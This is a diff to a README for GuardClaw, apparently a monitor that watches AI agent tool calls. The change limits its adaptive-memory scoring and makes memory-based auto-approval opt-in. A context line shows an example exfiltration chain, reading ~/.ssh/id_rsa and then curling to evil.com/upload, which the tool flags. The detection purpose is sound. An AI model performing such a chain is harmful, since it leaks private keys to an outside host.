@@ -43,7 +43,7 @@ This allows GuardClaw to detect attacks that unfold over hundreds of tool calls 
 read ~/.ssh/id_rsa  →  curl evil.com/upload   ← flagged as exfiltration chain
 ```
 
-**Adaptive memory** — every approve/deny decision trains a pattern store. Frequently approved patterns get lower scores; frequently denied patterns get higher scores. Patterns with ≥ 3 approvals and confidence > 0.7 skip the LLM entirely.
+**Adaptive memory** — every approve/deny decision trains a pattern store. Retrieved patterns are injected as neutral evidence, and score nudges are capped so memory cannot cross the main safe/warn/ask decision bands. Judge-skipping memory auto-approve is disabled by default and requires `GUARDCLAW_MEMORY_AUTO_APPROVE=1`.
 
 ### 4. Active Intervention
 
